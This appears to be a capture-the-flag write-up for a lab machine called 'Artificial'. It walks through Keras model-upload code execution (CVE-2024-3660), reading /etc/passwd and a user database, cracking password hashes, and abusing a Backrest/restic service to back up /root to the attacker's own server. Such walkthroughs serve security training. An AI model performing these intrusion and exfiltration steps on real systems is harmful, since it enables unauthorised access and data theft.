---
layout: post
title: "An Artificial World"
date: 2025-09-22
---

## Challenge Description
This was a cool Machine to pwn.

## Solution
Lets start by getting the needed informations to access the website:

`sudo nano /etc/hosts`

`10.10.11.74 artificial.htb`

Now that we have resolved the address we can access it

`nmap 10.10.11.74`

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-13 09:29 CEST
Nmap scan report for artificial.htb (10.10.11.74)
Host is up (0.053s latency).
Not shown: 997 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
31337/tcp open  Elite
```

`python dirsearch.py -u http://arificial.htb`

```
Target: http://artificial.htb/     

[09:29:58] Scanning:                                                                                                             
[09:30:08] 302 -   199B - /dashboard  ->  /login                                                   
[09:30:12] 200 -   857B - /login                                                                        
[09:30:12] 302 -   189B - /logout  ->  /                                                    
[09:30:15] 200 -   952B - /register                                         
                                                                             
Task Completed
```

I registered and logged in. Once logged in I saw that we can upload .h5 files. I created one and uploaded it for testing.
While running the uploaded file, I catched a request with Burpsuite and I saw that we have a cookie session that if decode in base64 gives us this string:

{"user_id":14,"username":"asd"}R3׈QqH

But unfortunately this is not the right path. In the Dashboard page, after logging in I noticed that I was able to download a docker file and a file called `requirements.txt`. The `requirements.txt` was containing this line:

`tensorflow-cpu==2.13.1`

So I looked online for CVEs related to `tensorflow 2.13.1`, and I found out this CVE-2024-3660. A arbitrary code injection vulnerability in TensorFlow's Keras framework (<2.13) allows attackers to execute arbitrary code with the same permissions as the application using a model that allow arbitrary code irrespective of the application.

I used this [POC](https://github.com/aaryanbhujang/CVE-2024-3660-PoC) as starting point for executing a shell. Once the shell has been executed I started looking around for some data I can use to enstablish an ssh connection:

`cat /etc/passwd`

```
root:x:0:0:root:/root:/bin/bash                                                                                                   
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                                                                                   
bin:x:2:2:bin:/bin:/usr/sbin/nologin                                                                                              
sys:x:3:3:sys:/dev:/usr/sbin/nologin                                                                                              
sync:x:4:65534:sync:/bin:/bin/sync                                                                                                
games:x:5:60:games:/usr/games:/usr/sbin/nologin                                                                                   
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin                                                                                   
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin                                                                                      
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin                                                                                       
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin                                                                                 
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin                                                                               
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin                                                                                        
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin                                                                              
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin                                                                              
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin                                                                     
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin                                                                                  
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin                                                 
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin                                                                        
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin                                            
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
gael:x:1000:1000:gael:/home/gael:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
app:x:1001:1001:,,,:/home/app:/bin/bash
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
_laurel:x:997:997::/var/log/laurel:/bin/false
```

```
ls
app.py  instance  models  __pycache__  static  templates

cd instance/

ls
users.db

sqlite3 users.db .tables
model  user 
```

```
sqlite3 users.db "SELECT * FROM user"

1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
6|bmbmbm|bmbmbm@bmbmbm.bmbmbm|b64071f9b330181dd011ac2c09a09cda
7|omar|omar@omar.com|e10adc3949ba59abbe56e057f20f883e
8|asd|asd@asd.com|a8f5f167f44f4964e6c998dee827110c
9|admin|admin@admin.com|21232f297a57a5a743894a0e4a801fc3
10|adam|adam@adam.com|1d7c2923c1684726dc23d2901c4d8157
11|parrot|parrot@gmail.com|827ccb0eea8a706c4c34a16891f84e7b

sqlite3 users.db "SELECT * FROM model"
7bd7d97f-f197-4203-b63c-331c60406374|7bd7d97f-f197-4203-b63c-331c60406374.h5|7
bdfd1378-34f2-48f6-b484-cbf43132ef09|bdfd1378-34f2-48f6-b484-cbf43132ef09.h5|7
c63790da-9f67-4dec-aa60-80728eb12307|c63790da-9f67-4dec-aa60-80728eb12307.h5|10
ce81aa4d-cf7b-4fd9-99b9-58e5e92db795|ce81aa4d-cf7b-4fd9-99b9-58e5e92db795.h5|6
0f82a2e1-d2d7-4fd6-a217-68d22d66bbb4|0f82a2e1-d2d7-4fd6-a217-68d22d66bbb4.h5|8
```

If we use `hash-identifier` we can see that these are all `MD5` hashes:

`c99175974b6e192936d97224638a34f8`

And by using some cracker we are able to retrive the password:

`mattp005numbertwo`

Now lets try to enstablish an ssh connection. 

`ssh gael@artificial.htb`
`mattp005numbertwo`

Once inside I am able to retrive the user flag:

`gael@artificial:~$ cat user.txt`

`8aa7596c0be1f2b9a84a620754e0414e`

Now that we have the user flag! Lets move to the root flag.

```
gael@artificial:~$ sudo -i
gael is not in the sudoers file.  This incident will be reported.

gael@artificial:~$ id
uid=1000(gael) gid=1000(gael) groups=1000(gael),1007(sysadm)

gael@artificial:~$ find / -group sysadm 2>/dev/null
/var/backups/backrest_backup.tar.gz

ls -l /var/backups/backrest_backup.tar.gz
-rw-r----- 1 root sysadm 52357120 Mar  4  2025 /var/backups/backrest_backup.tar.gz
```

So we can use it! Now lets look at whats inside it without extracting it.

```
tar -tf /var/backups/backrest_backup.tar.gz | sed -n '1,200p'

backrest/
backrest/restic
backrest/oplog.sqlite-wal
backrest/oplog.sqlite-shm
backrest/.config/
backrest/.config/backrest/
backrest/.config/backrest/config.json
backrest/oplog.sqlite.lock
backrest/backrest
backrest/tasklogs/
backrest/tasklogs/logs.sqlite-shm
backrest/tasklogs/.inprogress/
backrest/tasklogs/logs.sqlite-wal
backrest/tasklogs/logs.sqlite
backrest/oplog.sqlite
backrest/jwt-secret
backrest/processlogs/
backrest/processlogs/backrest.log
backrest/install.sh
```

```
gael@artificial:~$ tar -xf /var/backups/backrest_backup.tar.gz -O backrest/.config/backrest/config.json | python3 -m json.tool

{                                                                                                                                
    "modno": 2,                                                                                                                  
    "version": 4,                                                                                                                
    "instance": "Artificial",                                                                                                    
    "auth": {                                                                                                                    
        "disabled": false,                                                                                                       
        "users": [                                                                                                               
            {                                                                                                                    
                "name": "backrest_root",                                                                                         
                "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"             
            }
        ]
    }
}
```

```
gael@artificial:~$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt hash1.txt

Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!@#$%^           (?)     
1g 0:00:00:11 DONE (2025-09-19 16:39) 0.08347g/s 450.7p/s 450.7c/s 450.7C/s techno..huevos
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Lets use the tool John The Ripper to retrive the password by using the wordlist `rockyou.txt`.

```
john --show hash1.txt 
!@#$%^

1 password hash cracked, 0 left
```

Nice, now we have a username and password but we need to understand where to use them since they are not working on the web application or via ssh.

```
gael@artificial:~$ tar -xf /var/backups/backrest_backup.tar.gz -O backrest/install.sh
#! /bin/bash

cd "$(dirname "$0")" # cd to the directory of this script

install_or_update_unix() {
  if systemctl is-active --quiet backrest; then
    sudo systemctl stop backrest
    echo "Paused backrest for update"
  fi
  install_unix
}

install_unix() {
  echo "Installing backrest to /usr/local/bin"
  sudo mkdir -p /usr/local/bin

  sudo cp $(ls -1 backrest | head -n 1) /usr/local/bin
}

create_systemd_service() {
  if [ ! -d /etc/systemd/system ]; then
    echo "Systemd not found. This script is only for systemd based systems."
    exit 1
  fi

  if [ -f /etc/systemd/system/backrest.service ]; then
    echo "Systemd unit already exists. Skipping creation."
    return 0
  fi

  echo "Creating systemd service at /etc/systemd/system/backrest.service"

  sudo tee /etc/systemd/system/backrest.service > /dev/null <<- EOM
[Unit]
Description=Backrest Service
After=network.target

[Service]
Type=simple
User=$(whoami)
Group=$(whoami)
ExecStart=/usr/local/bin/backrest
Environment="BACKREST_PORT=127.0.0.1:9898"
Environment="BACKREST_CONFIG=/opt/backrest/.config/backrest/config.json"
Environment="BACKREST_DATA=/opt/backrest"
Environment="BACKREST_RESTIC_COMMAND=/opt/backrest/restic"

[Install]
WantedBy=multi-user.target
EOM

  echo "Reloading systemd daemon"
  sudo systemctl daemon-reload
}

create_launchd_plist() {
  echo "Creating launchd plist at /Library/LaunchAgents/com.backrest.plist"

  sudo tee /Library/LaunchAgents/com.backrest.plist > /dev/null <<- EOM
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.backrest</string>
    <key>ProgramArguments</key>
    <array>
    <string>/usr/local/bin/backrest</string>
    </array>
    <key>KeepAlive</key>
    <true/>
    <key>EnvironmentVariables</key>
    <dict>
        <key>PATH</key>
        <string>/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin</string>
        <key>BACKREST_PORT</key>
        <string>127.0.0.1:9898</string>
    </dict>
</dict>
</plist>
EOM
}

enable_launchd_plist() {
  echo "Trying to unload any previous version of com.backrest.plist"
  launchctl unload /Library/LaunchAgents/com.backrest.plist || true
  echo "Loading com.backrest.plist"
  launchctl load -w /Library/LaunchAgents/com.backrest.plist
}

OS=$(uname -s)
if [ "$OS" = "Darwin" ]; then
  echo "Installing on Darwin"
  install_unix
  create_launchd_plist
  enable_launchd_plist
  sudo xattr -d com.apple.quarantine /usr/local/bin/backrest # remove quarantine flag
elif [ "$OS" = "Linux" ]; then
  echo "Installing on Linux"
  install_or_update_unix
  create_systemd_service
  echo "Enabling systemd service backrest.service"
  sudo systemctl enable backrest
  sudo systemctl start backrest
else
  echo "Unknown OS: $OS. This script only supports Darwin and Linux."
  exit 1
fi

echo "Logs are available at ~/.local/share/backrest/processlogs/backrest.log"
echo "Access backrest WebUI at http://localhost:9898"
```

The `install.sh` file suggest us a service running locally on port 9898. If we go to http://localhost:9898 we have `Backrest` service running version `1.7.2`.
Since we have the following credentials:

```
backrest_root
!@#$%^
```

We can try logging in with them. Once logged in lets create a repo:

```
Name: test
url: /opt
pw: test
```

And execute this command: 

`help -o sftp.args=-oBatchMode=yes`

```
command: /opt/backrest/restic help -o sftp.args=-oBatchMode=yes -o sftp.args=-oBatchMode=yes

restic is a backup program which allows saving multiple revisions of files and

directories in an encrypted repository stored on different backends.

The full documentation can be found at https://restic.readthedocs.io/ .

Usage:

  restic [command]

Available Commands:

  backup        Create a new backup of files and/or directories

  cache         Operate on local cache directories

  cat           Print internal objects to stdout

  check         Check the repository for errors

  copy          Copy snapshots from one repository to another

  diff          Show differences between two snapshots

  dump          Print a backed-up file to stdout

  find          Find a file, a directory or restic IDs

  forget        Remove snapshots from the repository

  init          Initialize a new repository

  key           Manage keys (passwords)

  list          List objects in the repository

  ls            List files in a snapshot

  migrate       Apply migrations

  mount         Mount the repository

  prune         Remove unneeded data from the repository

  recover       Recover data from the repository not referenced by snapshots

  repair        Repair the repository

  restore       Extract the data from a snapshot

  rewrite       Rewrite snapshots to exclude unwanted files

  snapshots     List all snapshots

  stats         Scan the repository and show basic statistics

  tag           Modify tags on snapshots

  unlock        Remove locks other processes created

Advanced Options:

  features      Print list of feature flags

  options       Print list of extended options

Additional Commands:

  generate      Generate manual pages and auto-completion files (bash, fish, zsh, powershell)

  help          Help about any command

  self-update   Update the restic binary

  version       Print version information

Flags:

      --cacert file                      file to load root certificates from (default: use system certificates or $RESTIC_CACERT)

      --cache-dir directory              set the cache directory. (default: use system default cache directory)

      --cleanup-cache                    auto remove old cache directories

      --compression mode                 compression mode (only available for repository format version 2), one of (auto|off|max) (default: $RESTIC_COMPRESSION) (default auto)

  -h, --help                             help for restic

      --http-user-agent string           set a http user agent for outgoing http requests

      --insecure-no-password             use an empty password for the repository, must be passed to every restic command (insecure)

      --insecure-tls                     skip TLS certificate verification when connecting to the repository (insecure)

      --json                             set output mode to JSON for commands that support it

      --key-hint key                     key ID of key to try decrypting first (default: $RESTIC_KEY_HINT)

      --limit-download rate              limits downloads to a maximum rate in KiB/s. (default: unlimited)

      --limit-upload rate                limits uploads to a maximum rate in KiB/s. (default: unlimited)

      --no-cache                         do not use a local cache

      --no-extra-verify                  skip additional verification of data before upload (see documentation)

      --no-lock                          do not lock the repository, this allows some operations on read-only repositories

  -o, --option key=value                 set extended option (key=value, can be specified multiple times)

      --pack-size size                   set target pack size in MiB, created pack files may be larger (default: $RESTIC_PACK_SIZE)

      --password-command command         shell command to obtain the repository password from (default: $RESTIC_PASSWORD_COMMAND)

  -p, --password-file file               file to read the repository password from (default: $RESTIC_PASSWORD_FILE)

  -q, --quiet                            do not output comprehensive progress report

  -r, --repo repository                  repository to backup to or restore from (default: $RESTIC_REPOSITORY)

      --repository-file file             file to read the repository location from (default: $RESTIC_REPOSITORY_FILE)

      --retry-lock duration              retry to lock the repository if it is already locked, takes a value like 5m or 2h (default: no retries)

      --stuck-request-timeout duration   duration after which to retry stuck requests (default 5m0s)

      --tls-client-cert file             path to a file containing PEM encoded TLS client certificate and private key (default: $RESTIC_TLS_CLIENT_CERT)

  -v, --verbose                          be verbose (specify multiple times or a level using --verbose=n, max level/times is 2)

Use "restic [command] --help" for more information about a command.
```

Ok nice we know what we can use. On a terminal lets run this to start listening:

`./rest-server --path /tmp/restic-data --listen :PORT --no-auth`

On `BackRest` from the repo window used for running the commands lets use this:

`-r rest:http://IP:PORT/repo_name backup /root`

then lets restore the snapshot we've done by running this on our machine on a new terminal

`restic -r /tmp/restic-data/repo1 snapshots`

```
ID        Time                 Host        Tags        Paths  Size
-----------------------------------------------------------------------
be6d4b5f  2025-09-19 18:00:47  artificial              /root  4.299 MiB
-----------------------------------------------------------------------
1 snapshots
```

Now that we have the snapshot ID we can restore it

`restic -r /tmp/restic-data/repo1 restore be6d4b5f --target ./restore`

```
cd restore/root/

ls

root.txt  scripts

cat root.txt 

0488ebe155b19d0c67c3bcb6c60a8d2d
```

And we have also the root flag!

